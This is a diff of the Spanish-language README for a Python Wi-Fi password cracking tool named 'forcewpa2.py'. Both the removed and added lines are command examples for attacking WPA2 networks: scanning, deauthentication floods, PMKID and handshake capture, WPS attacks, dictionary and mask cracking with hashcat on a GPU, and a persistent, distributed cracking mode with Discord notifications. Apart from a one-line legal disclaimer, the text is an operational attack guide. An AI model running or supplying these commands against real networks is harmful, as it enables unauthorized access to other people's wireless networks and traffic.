@@ -18,30 +18,29 @@ Usar contra redes sin permiso es **ilegal**. El autor no se hace responsable.
 sudo apt install aircrack-ng hashcat
 pip install scapy
 
-🎯 Comandos de ejemplo con nuevas opciones
-# Escaneo detallado
-sudo python3 forcewpa2.py -i wlan0 --scan-only -v
+🚀 Cómo ejecutar TODO
 
-# Múltiples diccionarios en cascada
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wordlists rockyou.txt passwords.txt spanish.txt --gpu
+# Instalar dependencias
+pip install -r requirements.txt
 
-# Ataque por máscara (8 dígitos numéricos)
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --mask '?d?d?d?d?d?d?d?d' --gpu
+# Modo normal con todas las funciones
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --persistent --gpu --notify
 
-# Captura PMKID (más rápido, sin clients)
-sudo python3 forcewpa2.py -i wlan0 --pmkid
+# Modo persistente (reintenta automáticamente)
+sudo python3 forcewpa2.py -i wlan0 --persistent --max-attempts 20
 
-# Ataque WPS completo
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wps
+# Generar wordlist personalizada desde ESSID
+python3 -c "from modules.wordlist_generator import WordlistGenerator; g=WordlistGenerator(); g.generate_comprehensive('MiWifi123', 'AA:BB:CC:DD:EE:FF')"
 
-# Usar handshake existente + reglas hashcat
-sudo python3 forcewpa2.py -i wlan0 --handshake captura.cap -w rockyou.txt --rules best64.rule --gpu
+# Interfaz web
+sudo python3 web_interface.py
 
-# Con notificaciones y output JSON
-sudo python3 forcewpa2.py -i wlan0 --scan-only --notify --output resultados.json
+# Modo distribuido (maestro)
+sudo python3 distributed_controller.py
 
-# Deauth agresivo (nivel 10)
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth 10
+# Modo distribuido (worker en otra máquina)
+python3 distributed_worker.py 192.168.1.100
 
-# Time limit de 5 minutos
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --max-time 300
+# Con integración de APIs
+export DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
+sudo python3 forcewpa2.py -i wlan0 --use-api --api-key YOUR_KEY
